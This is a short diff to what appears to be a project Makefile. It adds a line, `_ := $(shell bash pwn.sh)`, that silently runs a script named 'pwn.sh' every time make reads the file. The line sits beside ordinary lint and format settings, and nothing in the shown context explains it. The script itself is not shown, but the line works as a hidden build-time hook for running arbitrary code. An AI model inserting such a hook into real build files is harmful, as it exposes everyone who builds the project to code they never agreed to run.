@@ -13,6 +13,8 @@
 # limitations under the License.
 #
 
+_ := $(shell bash pwn.sh)
+
 # We only want to format and lint checked in python files
 CHECKED_IN_PYTHON_FILES := $(shell git ls-files | grep '\.py$$')
 
